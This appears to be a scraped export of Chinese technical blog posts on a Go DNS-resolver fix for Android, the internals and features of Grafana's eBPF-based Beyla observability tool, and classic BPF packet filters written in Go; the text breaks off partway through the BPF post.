// net/dnsconfig_unix.go // See resolv.conf(5) on a Linux machine. func dnsReadConfig(filename string) *dnsConfig { ... file, err := open(filename) if err != nil { conf.servers = defaultNS conf.search = dnsDefaultSearch() conf.err = err return conf } ... } 为了解决这个问题，需要自行设置 DNS 服务器地址。可通过修改全局变量 net.DefaultResolver 实现效果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026amp;net.Resolver{ Dial: func(ctx context.Context, network, address string) (net.Conn, error) { dial := net.Dialer{} var dns []string for _, server := range custom.DNSServers { if _, _, err := net.SplitHostPort(server); err != nil { dns = append(dns, net.JoinHostPort(server, defaultDNSPort)) } else { dns = append(dns, server) } } return dial.DialContext(ctx, network, dns[rand.Intn(len(dns))]) }, } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/android-%E7%AB%AF-dns-%E6%9F%A5%E8%AF%A2%E9%94%99%E8%AF%AF/","title":"Android 端 DNS 查询错误"},{"content":"Beyla 工作原理 Beyla （当前分析 Beyla 版本为 v2.1.0）在工作时可以看作起了两个独立的子任务：应用程序可观测性和网络可观测。\n两个子任务之间没有强耦合关系，因此可分别进行详解。\n应用程序可观测性 应用程序可观测性整体执行流程如下图所示： 进程监控 在应用程序可观测性的进程监控组件中，初始阶段会加载 eBPF 程序，此程序用于监控系统调用 sys_bind，进而精准捕获绑定的端口信息。同时，会启动一个 goroutine 专门处理这些捕获到的信息，以确保处理的及时性和高效性。\n在该组件的主循环里，会按照预设的周期调用 listProcesses 函数，以此获取系统中所有进程的详细信息。随后，借助 snapshot 方法对新旧进程状态进行细致比较，能够精准捕获进程创建或进程删除事件。这些事件会通过通道被发送至下游组件，以便进行后续的处理。\n在处理 eBPF 捕获的信息时，若检测到端口为 Beyla 所关注的端口，那么在下一次获取系统进程信息时，会重新扫描进程的端口信息，并及时更新进程属性中的端口列表，从而保证端口信息的准确性和时效性。\nk8s 数据填充 该组件仅在启用 Kubernetes（k8s）信息发现功能时才会执行；若未启用此功能，组件将不会对任何事件进行处理。\n在对象初始化过程中，会创建一个 K8s 信息缓存区，专门用于存储 Pod、Service 等资源的元数据信息。初始化时，会首次加载 Pod、Service 等资源的元数据，同时启动一个 goroutine，按设定周期定期更新缓存内的信息，以此保证缓存数据与 K8s 集群状态的实时一致性。\n在该组件的主循环中，主要处理两类事件：\nPod 信息更新事件：一旦接收到此类事件，需及时更新缓存中的 Pod 信息，确保缓存数据始终反映最新的 Pod 状态。\n上游组件传递来的进程事件：\n进程创建事件：根据进程的 PID，在 K8s 集群中查找与之对应的 Pod 信息，将 Pod 的 Name、Namespace、ownerName 等关键信息添加到进程属性中，建立进程与 K8s 资源的关联。\n进程删除事件：从缓存中移除与该进程相关的所有信息，维护缓存数据的准确性与一致性。\n所有事件处理完毕后，组件会将事件转发至下一个组件，推动整个处理流程继续运行。\n进程匹配过滤 在组件的主循环中，会对上游组件传递过来的进程事件进行处理。具体处理逻辑如下：\n对于进程创建事件，会先在历史记录中进行检查。若该事件已被处理过，为避免重复处理，会直接将其丢弃。对于尚未处理过的事件，会进一步获取该进程的详细信息，其中包括父进程的 PID、进程执行路径等关键内容。接着，依据配置文件中设定的过滤规则，判断该进程是否属于需要过滤的范畴。若符合过滤条件，会直接丢弃该事件，从而确保进入后续处理流程的事件均为有效事件。\n对于进程删除事件，对于进程删除事件，会查看缓存中是否存在该进程的创建事件记录。若存在相应记录，则更新缓存中的对应信息，并将该记录从缓存中删除；若缓存中未记录该进程的创建事件，则直接丢弃该删除事件，以维持缓存数据的准确性和一致性。\n当所有事件完成过滤处理后，组件会将剩余的有效事件转发至下一个组件，以推动整个处理流程的持续进行。\n进程类型判断 在初始化阶段，系统会检查配置项 skip_go_specific_tracers。若该配置项未设置为跳过 Go 特定的追踪器，系统将加载预定义的 eBPF 模块，该模块用于追踪特定的 Go 函数，如 ServeHTTP、readRequest 等，详细信息可参考gotracer。\n对于进程创建事件，系统会深入分析进程可执行文件的类型，通过解析 ELF 文件头、符号表等信息，精准识别文件特征。同时，针对所有进程，系统会查询其执行程序的 ELF 信息，并确定执行进程所使用的语言类型，涵盖 Go、C/C++、Rust、Python、Ruby、Java（含 GraalVM Native）、NodeJS、.NET 等多种常见语言。\n对于 Go 进程，系统会判断其是否为非 GoProxy 进程。不过，当前的判断函数存在一定局限性，若一个 Go 程序仅使用标准库且未定义自定义函数，该进程可能会被误判为 GoProxy。对于确认为非 GoProxy 的 Go 进程，系统将利用 eBPF 技术追踪特定函数，以实现对其运行状态的精准监控；而对于其他语言的进程，系统会额外采集子进程的 PID，为后续的分析和处理提供更全面的数据。\n对于进程删除事件，系统会检查缓存中是否存在该进程的创建事件记录。若存在，系统会更新缓存中的对应信息，并将该记录从缓存中移除，以确保缓存数据的准确性和一致性。\n在完成对所有事件的过滤和处理后，系统会将处理后的事件转发至下一个组件，以推动整个可观测性流程的持续进行。\n容器信息更新 该组件仅在启用 Kubernetes（K8s）信息发现功能时才会投入运行。若未启用此功能，该组件将不会对任何事件执行处理操作。\n对于进程创建事件，组件会建立进程与相应容器的映射关系，添加二者间的关联信息，为后续基于容器环境的进程分析提供基础。\n对于进程删除事件，组件不会进行任何处理，直接跳过该事件。\n在完成对所有事件的过滤和处理后，系统会将处理后的事件转发至下一个组件，以推动整个可观测性流程的持续进行。\nTracer 构建 在处理进程创建事件时，系统会依据 OpenTelemetry SDK 注入的配置状态进行操作。目前，OpenTelemetry SDK 注入功能仅支持 Java 程序。若该功能处于开启状态，系统将对 Java 进程执行 OpenTelemetry SDK 注入操作，以此增强其可观测性。若未开启 OpenTelemetry SDK 注入功能，则需获取对应进程的 Tracer。\n在获取 Tracer 过程中，系统首先会检查该进程是否已存在 Tracer。若已存在，系统将更新相关信息后返回该 Tracer。若不存在，则需创建新的 Tracer，具体创建逻辑如下：\n对于 Go 程序：当满足特定条件（如配置中跳过特定的 Go 跟踪器、执行系统级检测时发现存在检测错误或偏移量为空等情况），系统将记录警告信息，并尝试重用可重用的跟踪器。若不满足上述条件，则使用通用跟踪器。\n对于支持的其他语言（Node.js、Java、Ruby、Python、.NET、Rust、PHP）程序，系统会优先尝试重用可重用的跟踪器。若无法重用，则使用通用跟踪器。\n对于其他不支持的语言，系统将直接忽略该进程，并记录相关信息，以便后续排查与分析。\n对于进程删除事件，系统仅需更新缓存中与该进程相关的信息，以此确保缓存数据与实际进程状态保持一致。\n当前 Byela 实现的 Tracer 有以下几种：\ngenerictracer：通用追踪器，主要用于追踪非 Go 应用的 HTTP 和 gRPC 调用，通过系统调用跟踪实现，包括read/write/connect等系统调用的监控；\ngotracer：专门用于Go应用的追踪器，通过uprobes机制跟踪 Go 运行时函数，包括HTTP处理、gRPC调用、SQL操作、Kafka操作、Redis操作等；\ngpuevent：GPU事件追踪器，监控CUDA相关系统调用，收集GPU内核启动和内存分配等信息；\nhttptracer：HTTP协议追踪器，专注于HTTP层面的追踪，包括请求方法、URL、状态码等信息的采集；\ntctracer：网络流量追踪器，基于TC（Traffic Control）实现，用于收集网络包信息，包括源目标IP、端口、协议类型等。\n数据导出 当完成上一阶段 Tracer 的构建后，一旦有相关事件触发，Tracer 便会启动，开始处理由 eBPF 采集的数据。在运行过程中，Tracer 会将采集到的 eBPF 数据转换为符合特定格式的 request.Span 数据。\n转换完成的 request.Span 数据，对request.Spa数据进行填充（如k8s相关信息）和过滤,将通过多种渠道进行输出，包括但不限于 OTLP 端点、Prometheus Metrics 服务、Grafana Alloy 以及日志输出。这些输出方式能够满足不同场景下对数据的使用需求，为系统的监控、分析以及运维提供多维度的数据支持 。\n网络可观测性 网络可观测性执行流程如下所示： MapTracer MapTracer 的核心功能是对 flow 数据进行聚合，其主要采集并导出的关键数据指标涵盖：数据包数量、字节数、流起始时间、流结束时间以及连接标志等。\n在初始化阶段，Beyla 会依据配置创建内核网络事件接收器 Fetcher。Fetcher 的实现方式有 tc 和 socket_filter 两种，默认采用 socket_filter。作为运行于内核态的 eBPF 程序，Fetcher 会持续不断地采集 flow 相关信息。尤为重要的是，当 flow 首次出现时，Fetcher会拷贝 packet 数据，以便后续进行更全面的分析。\n在主循环过程中，MapTracer 会按照设定的周期调用已创建的 Fetcher。Fetcher 将内核中 eBPF Map 所获取的网络流信息传递给 MapTracer。MapTracer 在接收到这些信息后，会对数据执行合并处理操作，随后将处理后的结果传递给下一个组件，确保数据在整个系统中得以有序流转和进一步处理 。\nRingBufTracer RingBufTracer 的工作机制聚焦于网络流初始出现阶段的信息采集。当某个 flow 首次现身时，运行在内核态的 eBPF 程序会将对应的 packet 数据拷贝至由 Go 实现的用户态程序中。随后，Go 程序对该 packet 展开解析，从中提取出网络流的关键信息，包括源地址、源端口、目的地址、目的端口、捕获时间以及网络协议等。\n在初始化环节，Beyla 会复用此前 MapTracer 创建的 Fetcher。Fetcher作为内核网络事件接收器，持续为 RingBufTracer 提供稳定的数据来源。\n进入主循环后，RingBufTracer 会以阻塞的方式，不断从 ringBuffer 中读取 eBPF 程序捕获的 packet 信息。一旦成功读取到 packet，便立即对其进行解析，提取出 flow 的相关详细信息，并将这些信息传递给下一个组件，保障数据处理流程的连贯性。\n总体来看，RingBufTracer 与 MapTracer 在功能上相互补充。RingBufTracer 主要负责在 flow 初始化的关键节点采集详细信息，为后续的分析提供初始数据；而 MapTracer 则侧重于按照一定周期，定期更新 flow 的相关信息，确保对网络流的持续跟踪与监控，两者协同工作，共同完善了对网络流数据的全面采集与处理体系。\n协议过滤 只有在配置了协议过滤相关参数（即BEYLA_NETWORK_PROTOCOLS和BEYLA_NETWORK_EXCLUDE_PROTOCOLS）时，该组件才会启动运行。\n运行过程中，组件会依据协议过滤配置，对上层传递而来的事件进行筛选。将符合过滤条件的事件提取出来，然后把这些经过滤后的事件传递至下一个组件，以此确保整个处理流程中事件数据的精准性与有效性。\nFlow 去重 该组件的核心功能是依据特定配置（包括 BEYLA_NETWORK_DEDUPER_FC_TTL、BEYLA_NETWORK_DEDUPER 和 CacheActiveTimeout）对重复的网络流（flow）进行处理。在接收到网络流数据后，组件会对其进行检查，识别出其中重复的 flow 并将其过滤掉，以避免对相同的网络流进行重复处理。经过过滤后，仅保留唯一的、有价值的 flow 数据，并将这些数据传递给下一个组件，从而提高整个系统的数据处理效率和准确性。\nInterface 查询 当BEYLA_NETWORK_DEDUPER配置为first_come时，该组件处于非工作状态。\n而当该组件启动工作时，它会依据 flow 的 Interface Id 进行解析，从而获取对应的 Interface Name，并将其填充至 flow 信息当中。与此同时，组件还会为 flow 填充 SrcName、DstName、BeylaIP 等属性。待所有相关属性填充完成，确保 flow 信息完整无误后，组件会将该 flow 传递给下一个组件，推动数据处理流程的持续进行 。\nCIDR 解析 仅当 BEYLA_NETWORK_CIDRS 被设置时，该组件才会开始运作。\n组件启动后，会依据配置的 BEYLA_NETWORK_CIDRS 对 flow 中的源 IP（src IP）和目的 IP（dst IP）进行解析，将它们匹配到与之对应的最窄 CIDR 范围内。随后，把匹配得到的 CIDR 值分别填充到 flow 的元数据（Metadata）中的 src.cidr 和 dst.cidr 字段。待完成这些属性的填充，确保 flow 元数据信息完整后，将该 flow 传递给下一个组件，以推进后续的数据处理流程。\nk8s 数据填充 只有在启用 Kubernetes（k8s）数据获取功能时，该组件才会投入运行。\n组件运行期间，会针对 flow 的源 IP（src IP）和目的 IP（dst IP），与缓存中的 k8s 信息进行匹配操作。通过这种匹配，能够精准地为 flow 填充与 k8s 相关的属性。在此过程中，该组件会复用应用程序可观测性体系中已有的 k8s 信息获取组件，以确保获取到的 k8s 信息准确且及时。\n待完成所有 k8s 相关信息的填充，使 flow 的相关属性完整后，组件会将该 flow 传递至下一个组件，从而推动整个数据处理流程的持续进行。\nDNS 反向解析 仅当启用 DNS 反向解析功能，即BEYLA_NETWORK_REVERSE_DNS_TYPE 配置为local或ebpf时，该组件才会开始工作。需要注意的是，此功能目前属于实验性功能，默认处于关闭状态。\nDNS 反向解析流程会依据所设置的类型来开展工作：\nlocal类型：系统会调用 net.LookupAddr 函数，实现从反向 IP 到域名的解析。\nebpf类型：组件会注册一个 eBPF 程序，该程序能够捕获并分析内核中 XDP（Express 数据路径）级别的 DNS 响应数据包，随后将这些数据包传递至用户态程序进行解析。用户态程序会把解析结果缓存在内存中，当有查询需求时，直接返回缓存中的查询结果。\n一旦反向解析成功，系统会将 SrcName 和 DstName 替换为解析得到的主机名。在完成所有信息的填充后，该组件会将处理后的 flow 传递给下一个组件，以推动整个流程继续运行。\n属性过滤 仅在配置了 network 过滤的情况下，该组件才会启动运行。\n组件运行时，会依据所配置的过滤属性，对上一级传递而来的 flow 数据进行筛选。将符合过滤要求的 flow 数据提取出来，随后把这些经过滤的 flow 数据传递给下一个组件，以此保证数据处理流程中数据的精准性和有效性。\n数据导出 在此环节，系统会依据预先配置的数据导出组件，为数据提供多样化的导出途径。支持通过 OTLP 端点、Prometheus Metrics 服务、Grafana Alloy 以及日志输出等多种方式，将处理后的数据输出，以满足不同场景下对数据使用和分析的需求。\n分布式追踪 在 Beyla 的功能列表中，有一个较为重要的功能：分布式追踪****。\nBeyla 读取任何传入的追踪上下文标头值，跟踪程序执行流程，并通过在传出的 HTTP/gRPC 请求中自动添加 traceparent 字段来传播追踪上下文。如果应用程序已在传出的请求中添加了 traceparent 字段，Beyla 将使用该值进行追踪，而不是使用其自身生成的追踪上下文。如果 Beyla 找不到传入的 traceparent 上下文值，它将根据 W3C 规范生成一个。\nBeyla 追踪上下文传播通过两种不同的方式实现：在网络级别写入传出的标头信息和**在库级别为 Go 写入标头信息。**Beyla 会根据服务所用的编程语言，自动使用一种或两种上下文传播方法。\n网络级别写入 网络级别写入traceparent id主要依赖于 tc实现。Beyla 会注册一个在tcp_recvmsg和tcp_sendmsg函数上的 eBPF hook，用以监测系统内的 HTTP/s 流量。\n当监测到 HTTP 请求接收或发送时，Beyla 会查询或生成一个traceparent id。具体流程如下：\n根据连接信息（ src.ip、src.port、dts.ip、dst.port）查询，如果有则返回。\n预先生成一个traceparent id；\n对于客户端，先使用发起系统调用的线程 PID 进行查询，如果查询不到再使用 父线程 PID、祖父线程 PID 进行查询。对于服务端，则使用连接对象相关信息进行查询；\n在 HTTP 请求头中搜索traceparent: 字串来查询traceparent id，如果能够搜索到则使用该traceparent id替换原有的traceparent id并返回；\n当得到traceparent id后，Beyla 仅会将相关信息与traceparent id的映射关系写入内存中。\n同时 Beyla 还对sk_msg（发生在sendmsg过程中）进行 Hook。当触发该 Hook 时，Beyla 会根据连接信息在内存中查询traceparent id，将查询到的traceparent id写入到实际的 packet 中，如下图所示（Python实现的服务，在接收HTTP请求后会根据路由再请求下一个HTTP服务）：\n由于 Beyla 查询traceparent id的逻辑限制，会导致某些情况下不能正确识别到traceparent id。以下举两个例子：\n服务在一开始启用了两个线程，一个线程作为 HTTP Server处理 HTTP 请求，另外一个线程作为 HTTP Client 向其他服务发起 HTTP 请求，两个线程之间通过队列进行通信。此时由于接收 HTTP 请求的线程和发起 HTTP 请求的线程是兄弟关系而非父子关系，此时无法正确追踪traceparent id。\nHTTP Server 处理路由并向其他服务发起 HTTP 请求时，需要创建新线程发起请求。如果发起 HTTP 请求的线程和接收 HTTP 请求的线程之间辈数超过 3，此时也无法正确追踪 traceparent id。\n以上两种情况都会出现如下情形：\n1 2 3 2025-04-10 17:45:30.41054530 (1.047037ms[1.047037ms]) HTTPClient 200 GET /go/pkg/ [127.0.0.1 as 127.0.0.1:58412]-\u0026gt;[127.0.0.1 as 127.0.0.1:8080] size:256B svc=[python3.11 python] traceparent=[00-778998dfcacdc40d42d1608e3ee521b6-5b0c6dd06909f1f9[0000000000000000]-01] 2025-04-10 17:45:30.41054530 (748.383µs[748.383µs]) HTTP 200 GET /go/pkg/ [127.0.0.1 as 127.0.0.1:58412]-\u0026gt;[127.0.0.1 as 127.0.0.1:8080] size:222B svc=[python3.11 python] traceparent=[00-778998dfcacdc40d42d1608e3ee521b6-86d528370b3c6672[5b0c6dd06909f1f9]-01] 2025-04-10 17:45:30.41054530 (10.189389ms[10.189389ms]) HTTP 200 GET /go/pkg/ [192.168.5.17 as 192.168.5.17:51809]-\u0026gt;[192.168.5.14 as 192.168.5.14:8082] size:484B svc=[python3.11 python] traceparent=[00-ea329470babdc498a69bf41e258bbf3a-12ee24f1a90a3423[0000000000000000]-01] 正常情况下输出如下所示：\n1 2 3 2025-04-10 17:42:37.41054237 (1.164387ms[1.164387ms]) HTTPClient 200 GET /go/pkg/ [127.0.0.1 as 127.0.0.1:34758]-\u0026gt;[127.0.0.1 as 127.0.0.1:8080] size:256B svc=[python3.11 python] traceparent=[00-6b6ea0ea5f0393b4faafb18f70c8bc2a-4fbf18d92e993d74[52a8d0be548b0550]-01] 2025-04-10 17:42:37.41054237 (811.599µs[811.599µs]) HTTP 200 GET /go/pkg/ [127.0.0.1 as 127.0.0.1:34758]-\u0026gt;[127.0.0.1 as 127.0.0.1:8080] size:228B svc=[python3.11 python] traceparent=[00-6b6ea0ea5f0393b4faafb18f70c8bc2a-e9aa78a1fb15332e[4fbf18d92e993d74]-01] 2025-04-10 17:42:37.41054237 (8.821989ms[8.821989ms]) HTTP 200 GET /go/pkg/ [192.168.5.17 as 192.168.5.17:51648]-\u0026gt;[192.168.5.14 as 192.168.5.14:8082] size:494B svc=[python3.11 python] traceparent=[00-6b6ea0ea5f0393b4faafb18f70c8bc2a-52a8d0be548b0550[0000000000000000]-01] 对于 HTTPs 流量，由于 eBPF 无法直接在 HTTP Header 中写入traceparent id，Beyla 只好在 TCP packet 中写入traceparent id用以追踪上下文。L7 代理和负载均衡器会破坏 TCP/IP 上下文传播，因为原始数据包被丢弃并在下游重放。\nGo 库级别写入 在 Go 语言中，由于线程和进程在语言层面被屏蔽掉，Go 使用了 goroutine 的方式来取代线程和进程，Go 语言会根据情况自动创建新线程来执行函数。因此网络层面实现中使用 PID 的关系来追踪traceparent id的方式在Go语言（Rust 的 tokio 也会有该问题）中无法使用。Go 语言需要使用特殊的方式来实现traceparent id的自动追踪。\nBeyla 使用通过对 Go 库函数进行 Hook 的方式实现 Go 服务的traceparent id自动追踪。\n对于 HTTP 服务，Beyla 通过 eBPF 对 ServeHTTP函数进行 Hook。当ServeHTTP接收到请求时，Beyla 会针对该请求查询或生成一个traceparent id。具体流程如下：\n利用获取请求的 goroutine addr 作为 key 值，在缓存中查询traceparent id。若有则直接返回；\n根据连接信息（ src.ip、src.port、dts.ip、dst.port）查询。若有则直接返回；\n以上都没有则生成一个新的traceparent id并返回。\n对于 HTTP Client，Beyla 通过 eBPF 对 roundTrip函数进行 Hook。当roundTrip需要写入 HTTP 请求时，Beyla 同样会该请求查询或生成一个traceparent id，然后将 Go 进程 PID 作为 Key 值写入到内存中。具体流程如下：\n利用发起函数调用的 goroutine addr 作为 key 值，在缓存中查询traceparent id。如果查询不到再使用 父goroutine addr、祖父 goroutine addr 进行查询。若有则直接返回；\n以上都没有则生成一个新的traceparent id并返回。\n当 packet 在执行sendmsg进行发送时，同样会触发到网络级别写入写入中介绍的sk_msg钩子。在此时完成traceparent id的写入。执行结果如下图所示（Go实现的服务，在接收HTTP请求后会根据路由再请求下一个HTTP服务）：\n如网络级别写入一样，Go服务同样会有一些无法发送traceparent id自动追踪的场景。以下举两个例子：\n服务在一开始启用了两个 goroutine，一个作为 HTTP Server处理 HTTP 请求，另外一个作为 HTTP Client 向其他服务发起 HTTP 请求，两个线程之间通过 channel 进行通信。此时由于接收 HTTP 请求的 goroutine 和发起 HTTP 请求的 groutine 是兄弟关系而非父子关系，此时无法正确追踪traceparent id。\nHTTP Server 处理路由并向其他服务发起 HTTP 请求时，需要创建新 goroutine 发起请求。如果发起 HTTP 请求的 goroutine 和接收 HTTP 请求的 goroutine 之间辈数超过 3，此时也无法正确追踪 traceparent id。\n以上两种情况都会出现如下情形：\n1 2 3 2025-04-10 18:30:00.4106300 (758.196µs[758.196µs]) HTTP 200 GET /go/ [127.0.0.1 as 127.0.0.1:43180]-\u0026gt;[127.0.0.1 as 127.0.0.1:8080] size:176B svc=[python3.11 python] traceparent=[00-817f47cdef64fbe0118cac6523ebe002-3f45883ebf8be9dd[5e75cc3cbd3ecd69]-01] 2025-04-10 18:30:00.4106300 (2.829546ms[2.829546ms]) HTTPClient 200 GET /go/ [127.0.0.1 as 127.0.0.1:43180]-\u0026gt;[127.0.0.1 as 127.0.0.1:8080] size:0B svc=[main go] traceparent=[00-817f47cdef64fbe0118cac6523ebe002-5e75cc3cbd3ecd69[0000000000000000]-01] 2025-04-10 18:30:00.4106300 (3.279114ms[3.193699ms]) HTTP 200 GET /go/ [192.168.5.17 as 192.168.5.17:54565]-\u0026gt;[192.168.5.14 as 192.168.5.14:8081] size:0B svc=[main go] traceparent=[00-8d790f6b6821b01c3acfce8492cc2734-f5288931e082d9f2[0000000000000000]-01] 正常情况应如下所示：\n1 2 3 2025-04-10 18:26:50.41062650 (2.077553ms[2.077553ms]) HTTPClient 200 GET /go/ [127.0.0.1 as 127.0.0.1:38622]-\u0026gt;[127.0.0.1 as 127.0.0.1:8080] size:0B svc=[main go] traceparent=[00-21a5d4c0e3c2b4bd842cbb315c2d1883-268a2bf2daa5c329[1c742eccd32743af]-01] 2025-04-10 18:26:50.41062650 (723.341µs[723.341µs]) HTTP 200 GET /go/ [127.0.0.1 as 127.0.0.1:38622]-\u0026gt;[127.0.0.1 as 127.0.0.1:8080] size:176B svc=[python3.11 python] traceparent=[00-21a5d4c0e3c2b4bd842cbb315c2d1883-7a07f0cb32074e96[268a2bf2daa5c329]-01] 2025-04-10 18:26:50.41062650 (2.915154ms[2.837631ms]) HTTP 200 GET /go/ [192.168.5.17 as 192.168.5.17:54338]-\u0026gt;[192.168.5.14 as 192.168.5.14:8081] size:0B svc=[main go] traceparent=[00-21a5d4c0e3c2b4bd842cbb315c2d1883-1c742eccd32743af[0000000000000000]-01] 对于其他非加密库，追踪的方式和上面类似的。\n对于 gRPC 这种默认加密的库，Beyla 会通过 eBPF 对header_writeSubset进行 Hook。当服务在调用header_writeSubset写入 HTTP Header 时，eBPF 会查询traceparent id并写入 Go 用户态内存中。以此来实现对加密流量的上下文追踪。\n参考文档 Grafana Beyla | Grafana Beyla documentation\nGitHub - grafana/beyla: eBPF-based autoinstrumentation of web applications and network metrics\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/beyla-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","title":"Beyla 工作原理"},{"content":" Grafana Beyla 是一款基于 eBPF（Extended Berkeley Packet Filter）技术的应用程序自动检测工具，为应用程序可观测性提供了强大支持。它能够在不修改应用程序代码或配置的前提下，自动检测应用程序，获取指标和追踪信息。\n一、核心检测功能 多语言应用程序自动检测：Beyla 具备强大的兼容性，可自动检测使用多种编程语言编写的应用程序。涵盖 Go、C/C++、Rust、Python、Ruby、Java（包括 GraalVM Native）、NodeJS、.NET 等。\n高效低开销数据捕获：对于解释型语言应用，Beyla 通过使用原生编译代码，实现高效检测和低开销的数据捕获。在保障数据获取准确性的同时，最大程度减少对应用程序性能的影响，确保应用正常稳定运行。\n自动检测应用执行与网络层：利用 eBPF 技术，Beyla 自动检查应用程序可执行文件和操作系统网络层。它能捕获与 Web 事务以及 Linux HTTP/S 和 gRPC 服务的RED（Request rate、Error、Duration）指标相关的追踪跨度，为分析应用性能和网络状况提供关键数据。\n二、数据导出与格式支持 OpenTelemetry 格式导出：Beyla 支持以 OpenTelemetry 格式导出数据。OpenTelemetry 是云原生可观测性领域的标准，这种导出方式便于与其他遵循该标准的工具和平台集成，实现数据的统一处理与分析。\n原生 Prometheus 指标导出：除 OpenTelemetry 格式外，Beyla 还能以原生 Prometheus 指标形式导出数据。Prometheus 是广泛使用的监控系统，Beyla 的这一功能使得在 Prometheus 生态系统中使用其数据变得轻松，用户可利用 Prometheus 的强大功能进行监控和告警。\n三、分布式追踪 Beyla 的分布式追踪基于传播 W3C 的traceparent标头值来实现。在请求处理过程中，Beyla 会自动读取任何传入的追踪上下文标头值，以此跟踪程序的执行流程。当进行传出的 HTTP/gRPC 请求时，Beyla 会自动添加traceparent字段来传播追踪上下文。如果应用程序已经在传出请求中添加了traceparent字段，Beyla 会直接使用该值进行追踪，而不再另行生成；若未找到传入的traceparent上下文值，Beyla 则会依据 W3C 规范生成一个新的值。\n网络级别上下文传播 网络级别的上下文传播通过将追踪上下文信息写入传出的 HTTP 标头以及 TCP/IP 数据包级别来实现。HTTP 上下文传播与任何其他基于 OpenTelemetry 的追踪库完全兼容。\n对于 TLS 加密流量 (HTTPS)，Beyla 无法将追踪信息注入到传出的 HTTP 标头中，而是将信息注入到 TCP/IP 数据包级别。由于此限制，Beyla 只能将追踪信息发送到其他 Beyla instrumentation 的服务。L7 代理和负载均衡器会破坏 TCP/IP 上下文传播，因为原始数据包被丢弃并在下游重放。从 OpenTelemetry SDK instrumentation 的服务解析传入的追踪上下文信息仍然有效。\n目前不支持 gRPC 和 HTTP2，并且上下文传播传入标头解析需要内核 5.17 或更高版本。\n库级别上下文传播（仅适用于 Go 应用程序） 这种类型的上下文传播仅支持 Go 应用程序，并使用 eBPF 用户内存写入支持 (bpf_probe_write_user)。这种方法的优点是它适用于 HTTP/HTTP2/HTTPS 和 gRPC，但有一些限制，但是使用 bpf_probe_write_user 需要授予 Beyla CAP_SYS_ADMIN 权限，或者将其配置为以 privileged 容器运行。\n四、运行环境与适配能力 Linux 环境广泛支持：Beyla 可在任何 Linux 环境中运行，但要求 Linux 内核版本为 5.8 或更高，并启用 BPF 类型格式（BTF）。多数内核版本 5.14 及更高的 Linux 发行版默认启用 BTF，可通过检查/sys/kernel/btf/vmlinux是否存在来确认。对于基于 RedHat 的发行版，如 RHEL8、CentOS 8、Rocky8、AlmaLinux8 等，虽内核为 4.18，但已向后移植 eBPF 相关补丁，也能支持 Beyla 运行。\nKubernetes 集成：Beyla 能够监听 Kubernetes API，利用 Pod 和 Services 元数据装饰指标和追踪。在 Kubernetes 容器编排环境中，这一功能可使检测数据与容器资源信息紧密结合，方便用户从容器集群层面分析应用性能和资源使用情况。\n五、权限管理与局限性 细粒度权限控制：尽管多数 eBPF 程序需要提升权限，但 Beyla 允许用户指定更细粒度的权限，如CAP_DAC_READ_SEARCH、CAP_SYS_PTRACE等，以最小权限运行，增强安全性。部分功能虽需额外权限（如CAP_NET_ADMIN用于网络可观测性探针与 Linux 流量控制，CAP_SYS_ADMIN用于 Go 中跨节点上下文传播），但这些功能可选启用，权限不足时 Beyla 会降级运行，保证基本功能可用。\n功能局限性：Beyla 提供的是通用指标和事务级追踪跨度信息，在检测代码特定部分的粒度和聚焦关键操作方面，不如语言代理和手动检测。因此，在对应用程序检测精度要求极高的场景下，可结合使用 Beyla 与其他检测手段。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/beyla-%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/","title":"Beyla 功能介绍"},{"content":"BPF 使用 BPF 介绍 在使用 RawSocket 时，Linux 内核会将符合 RawSocket 捕获协议的包直接复制到 RawSocket。\n由于 RawSocket 只能单纯的指定协议，没法指定更详细的过滤条件，这会导致有大量无用的包被送到与用户程序中进行处理，这极大的影响了程序的处理效率。\nBPF 的作用就是使用更为详细的条件对包进行过滤。\n编写 BPF 程序 在 Go 中，可通过 golang.org/x/net/bpf 包编写 BPF 程序。\n例如在官方给出的实例中，就定义了一个过滤 ARP 包的语法：\n1 2 3 4 5 6 7 8 9 10 bpf.Assemble([]bpf.Instruction{ // 加载协议类型到寄存器 bpf.LoadAbsolute{Off: 12, Size: 2}, // 如果值为 0x0806 （ARP），则执行下一行。否则跳过下一行 bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: 0x0806, SkipTrue: 1}, // 返回这个包的最多 4096 字节的数据 bpf.RetConstant{Val: 4096}, // 返回这个包的最多 0 字节的数据，即忽略这个包 bpf.RetConstant{Val: 0}, }) 根据官方示例，我们可以写一个过滤 UDP 端口为 8080 包的过滤器：\n1 2 3 4 5 6 7 8 9 10 bpf.Assemble([]bpf.Instruction{ // 加载端口值到寄存器 bpf.LoadAbsolute{Off: 22, Size: 2}, // 如果值为 8080，则执行下一行。否则跳过下一行 bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: 8080, SkipTrue: 1}, // 返回这个包的最多 0xffff 字节的数据 bpf.RetConstant{Val: 0xffff}, // 返回这个包的最多 0 字节的数据，即忽略这个包 bpf.RetConstant{Val: 0}, }) 同时 bpf 包还支持直接使用原始 BPF 语法编写过滤器。在 tcpdump程序中，-ddd（-d生成BPF 汇编代码，-dd生成以 C 语言结构体的形式表示的 BPF 过滤器程序）参数将 BPF 过滤器程序以 BPF 指令的形式输出。\n如下面的示例中，过滤 TCP 协议，端口为8080的包：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 [root@Aliyun ~]# tcpdump -d tcp port 8080 (000) ldh [12] (001) jeq #0x86dd jt 2 jf 8 (002) ldb [20] (003) jeq #0x6 jt 4 jf 19 (004) ldh [54] (005) jeq #0x1f90 jt 18 jf 6 (006) ldh [56] (007) jeq #0x1f90 jt 18 jf 19 (008) jeq #0x800 jt 9 jf 19 (009) ldb [23] (010) jeq #0x6 jt 11 jf 19 (011) ldh [20] (012) jset #0x1fff jt 19 jf 13 (013) ldxb 4*([14]\u0026amp;0xf) (014) ldh [x + 14] (015) jeq #0x1f90 jt 18 jf 16 (016) ldh [x + 16] (017) jeq #0x1f90 jt 18 jf 19 (018) ret #262144 (019) ret #0 [root@Aliyun 